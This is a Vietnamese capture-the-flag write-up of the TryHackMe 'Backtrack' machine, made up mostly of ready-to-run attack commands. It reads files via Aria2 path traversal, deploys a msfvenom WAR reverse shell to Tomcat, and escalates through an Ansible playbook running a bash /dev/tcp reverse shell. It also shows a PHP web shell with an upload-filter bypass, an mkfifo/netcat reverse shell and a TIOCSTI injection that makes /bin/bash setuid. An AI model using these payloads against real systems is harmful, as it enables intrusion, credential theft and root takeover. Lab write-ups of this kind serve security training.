# Backtrack-TryHackMe

recon 

└─$ rustscan -a 10.201.13.188 -- -sV -sC

<img width="596" height="309" alt="image" src="https://github.com/user-attachments/assets/0e7672e7-4c59-4c78-a9f4-ad0ebd1ad2b1" />

cổng 22, 6800, 8080, 8888 mở

tiến hành kiểm tra các port 

port 8080

<img width="1287" height="764" alt="image" src="https://github.com/user-attachments/assets/3de6633e-ee0d-4376-b39a-feab7ebdbc1e" />

port 8888

<img width="1280" height="766" alt="image" src="https://github.com/user-attachments/assets/687bd906-5ae8-4c9a-91bf-7dccc75cbfda" />


enumerating

└─$ gobuster dir -u http://10.201.13.188:8080/ -w /usr/share/wordlists/dirb/common.txt

<img width="774" height="425" alt="image" src="https://github.com/user-attachments/assets/4b9be8e9-cf71-4d91-aa52-2da5851ecabe" />

└─$ gobuster dir -u http://10.201.13.188:8888/ -w /usr/share/wordlists/dirb/common.txt

<img width="734" height="358" alt="image" src="https://github.com/user-attachments/assets/f247c824-7995-4b28-a71c-d9e951279d2c" />

Settings -> Server info

<img width="1246" height="741" alt="image" src="https://github.com/user-attachments/assets/f2d160c1-a741-40ed-8ac9-5c598f89e308" />

từ đây tôi xác định được CVE-2023-39141 từ Aria2 Version 1.35.0 

PoC : https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e

curl --path-as-is 'http://10.201.53.34:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'

<img width="1085" height="651" alt="image" src="https://github.com/user-attachments/assets/0f2cc010-ea23-4eae-a7bf-0ebfbe95bd20" />

thư mục gốc của user tomcat là /opt/tomcat và dựa vào thông báo từ http://10.201.53.34:8080/host-manager/html

ta có thể đọc thông tin đăng nhập 

curl --path-as-is 'http://10.201.53.34:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml'

<img width="1225" height="221" alt="image" src="https://github.com/user-attachments/assets/eb3e0fd7-91ef-4e75-969e-53f9fa415d4b" />

username="tomcat" password="OPx52k53D8OkTZpx4fr"

dường như nó chưa có tác dụng khi mà tôi thử đăng nhập trên web lẫn ssh 

tôi bắt đầu tìm cách đẩy shell vào web 

đầu tiên khởi chạy netcat

nc -lvnp 1234

sau đó sử dụng msfvenom

msfvenom -p  java/shell_reverse_tcp LHOST=10.14.108.226 LPORT=1234 -f war -o shell.war

sau đó sử dụng curl để đẩy shell vào 

curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file shell.war  'http://10.201.123.42:8080/manager/text/deploy?path=/myapp&update=true'

curl http://10.201.123.42:8080/myapp 

<img width="1200" height="674" alt="image" src="https://github.com/user-attachments/assets/e01767ec-e400-4e85-8f0e-781847313404" />

sau đó ta đã có được shell

<img width="754" height="271" alt="image" src="https://github.com/user-attachments/assets/5a965ee0-8c25-4eb4-b437-08dc97ea1a71" />

flag1 nằm ở /opt/tomcat

<img width="1274" height="602" alt="image" src="https://github.com/user-attachments/assets/b78397fb-2c81-461d-9998-1794446f9caf" />

User tomcat có thể dùng sudo để chạy ansible-playbook với quyền wilbur mà không cần mật khẩu

Nếu thư mục playbook có thể chỉnh sửa, đây là đường leo quyền từ tomcat → wilbur

<img width="786" height="144" alt="image" src="https://github.com/user-attachments/assets/3465a47f-38f4-40e0-882f-24c20fc49431" />

cat << 'EOF' > /tmp/revshell.yml

- name: Shell
  
  hosts: localhost
  
  gather_facts: no
  

  tasks:
  
    - name: Reverse Shell
      
      command: bash -c 'bash -i >& /dev/tcp/10.14.108.226/4444 0>&1'
      
EOF

sao đó khởi chạy trình lắng nghe netcat 

nc -lvnp 4444

chạy lệnh với quyền wilbur

sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/revshell.yml

<img width="685" height="376" alt="image" src="https://github.com/user-attachments/assets/b07e4db5-e7a2-4d40-898e-fcc08bb8006b" />

vậy là tôi đã có được shell của wilbur và tìm được file thú vị ở thư mục người dùng 

<img width="1272" height="268" alt="image" src="https://github.com/user-attachments/assets/cdabf656-d8e1-40d0-924c-27211892ad62" />

và ở thư mục /home/wilbur/.just_in_case.txt có thông tin đăng nhập của wilbur

1 thông tin đăng nhập trên máy chủ web cục bộ 

<img width="932" height="328" alt="image" src="https://github.com/user-attachments/assets/134144ec-3f6f-4317-b438-8ebb399fea6b" />

sau đó tôi tạo đường hầm ssh vào máy chủ cục bộ đó 

ssh -L 9999:127.0.0.1:80 wilbur@10.201.123.42

vậy là tôi đã vào được web cục bộ 

<img width="1281" height="759" alt="image" src="https://github.com/user-attachments/assets/56f04432-109f-4a5b-acd8-028857c4b647" />

sử dụng thông tin đăng nhập mà ta đã có 

khi tôi đưa vào 1 tệp .php thì nó hiển thị lỗi  

─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php  

<img width="1285" height="523" alt="image" src="https://github.com/user-attachments/assets/5c5235f6-c42b-40eb-8369-2cb31f96eace" />

Only JPG, JPEG, PNG, and GIF files are allowed

tôi thử đổi thành shell.png.php thì thành công 

<img width="1182" height="735" alt="image" src="https://github.com/user-attachments/assets/168cb39e-fca9-45f3-9dae-e538ca3a454d" />

nhưng khi truy cập thì thấy tệp không được thực thi 

<img width="1051" height="689" alt="image" src="https://github.com/user-attachments/assets/b2d17dc2-83e6-4feb-85e4-c9a019d1477c" />

tôi đã thử nhiều payload và thành công sau khi thử url mã hóa %25%32%65%25%32%65%25%32%66shell.png.php theo ../

<img width="1030" height="697" alt="image" src="https://github.com/user-attachments/assets/ee10a56b-5421-480f-b11d-a248fce8574a" />

và đã thành công 

<img width="995" height="440" alt="image" src="https://github.com/user-attachments/assets/0ba80e7f-0bfd-42f7-a795-46e92ce3e699" />

đầu tiên lắng nghe trên cổng 1234

sau đó chạy lệnh

curl -s --get 'http://127.0.0.1:9999/shell.png.php' --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.108.226 1234 >/tmp/f'

sau đó tôi đã có được cờ 2

<img width="915" height="514" alt="image" src="https://github.com/user-attachments/assets/1a8fc104-f3dd-4274-ac40-40e274b0a174" />

<img width="550" height="156" alt="image" src="https://github.com/user-attachments/assets/64e41b63-ff50-4077-8fda-7f8366880fdf" />

tôi sử dụng kiểu tấn công "TTY Pushback", thường thấy trong CTF hoặc các máy có phân quyền chưa chặt

đầu tiền tôi tạo 1 tệp python 

cat << 'EOF' > /home/orville/inject.py

#!/usr/bin/env python3

import fcntl

import termios

import os

import sys

import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':

  fcntl.ioctl(0, termios.TIOCSTI, char)

EOF

cấp quyền cho tệp 

chmod +x inject.py

xong sau đó chuyển nó vào tệp .bashrc

echo 'python3 /dev/shm/inject.py' >> .bashrc

Lệnh trên tạo một file Python tên inject.py chứa code khai thác TIOCSTI để tiêm lệnh chmod +s /bin/bash vào terminal

Khi file này được thực thi trong một shell có quyền cao hơn (ví dụ khi .bashrc của user đó tự động gọi script), nó sẽ biến /bin/bash thành một shell setuid. Sau đó attacker có thể chạy bash -p để có quyền root

<img width="882" height="495" alt="image" src="https://github.com/user-attachments/assets/ae07349e-f7f7-4768-b44b-abcef34e7ffb" />

vậy là tôi đã có cờ 3 

<img width="759" height="386" alt="image" src="https://github.com/user-attachments/assets/1fcc1758-d0ef-480c-af36-a851472f496d" />

<img width="1902" height="865" alt="image" src="https://github.com/user-attachments/assets/63f0f21a-985e-472b-aa76-bea53439cd8d" />
